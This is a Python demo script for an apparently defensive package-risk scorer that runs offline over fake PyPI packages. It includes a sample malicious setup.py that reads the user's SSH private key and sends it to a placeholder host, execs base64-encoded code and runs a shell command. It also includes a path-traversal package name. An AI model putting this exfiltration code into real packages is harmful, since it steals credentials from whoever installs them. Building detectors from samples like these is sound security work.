"""Offline demo: score two made-up packages (one clean, one malicious) with no network,
no SPIRE and no gateway. Run from the repo root:

    PYTHONPATH=src:. python docs/examples/offline_demo.py

Edit CASES to try your own input: (ecosystem, package, version).
"""
import json

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from attesta.policy.engine import load_policy
from attesta.scoring.errors import ScoringError
from attesta.scoring.reference import HeuristicExtractor, HeuristicModel
from attesta.scoring.service import ScoringService
from attesta.scoring.settings import ScoringSettings
from attesta.scoring.signer import ScorerSigner
from tests.scoring.helpers import FakeFetcher, FakeSubmitter, FixedAttestation, make_targz

CASES = [
    ("pypi", "tidy-utils", "1.0.0"),      # clean      -> ALLOW
    ("pypi", "evil-helper", "0.0.1"),     # malicious  -> BLOCK
    ("pypi", "../etc/passwd", "1.0"),     # invalid    -> rejected before any download
]

CLEAN = {"tidy-utils-1.0.0/setup.py": "from setuptools import setup\nsetup(name='tidy-utils')",
         "tidy-utils-1.0.0/tidy/__init__.py": "def add(a, b):\n    return a + b\n"}
EVIL = {"evil-helper-0.0.1/setup.py": (
    "import os, subprocess, base64, urllib.request\nfrom setuptools import setup\n"
    "k = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
    "urllib.request.urlopen('https://x.example/c?d=' + k)\n"
    "exec(base64.b64decode('cHJpbnQoMSk='))\nsubprocess.run(['sh', '-c', 'id'])\n"
    "setup(name='evil-helper', cmdclass={'install': object})")}


def main() -> None:
    fetcher = FakeFetcher()
    fetcher.add_pypi("tidy-utils", "1.0.0", make_targz(CLEAN), filename="tidy-utils-1.0.0.tar.gz")
    fetcher.add_pypi("evil-helper", "0.0.1", make_targz(EVIL), filename="evil-helper-0.0.1.tar.gz")
    service = ScoringService(
        ScoringSettings(), fetcher, HeuristicModel(), HeuristicExtractor(),
        load_policy("config/policy.yaml"), ScorerSigner("scorer-dev-1", Ed25519PrivateKey.generate()),
        FixedAttestation(verified=True),  # False would turn ALLOW into REVIEW
        FakeSubmitter())
    for ecosystem, package, version in CASES:
        label = f"{ecosystem}:{package}@{version}"
        try:
            s = service.score(ecosystem, package, version).summary()
        except ScoringError as exc:
            print(f"{label}\n  REJECTED: {exc}\n")
            continue
        flags = [k.removeprefix("flag_") for k, v in s["flags"].items() if v]
        print(f"{label}\n  decision={s['decision']} band={s['risk_band']} "
              f"score={s['risk_score']} flags={flags}\n")
    print(json.dumps({"hint": "edit CASES at the top of this file to try other input"}))


if __name__ == "__main__":
    main()
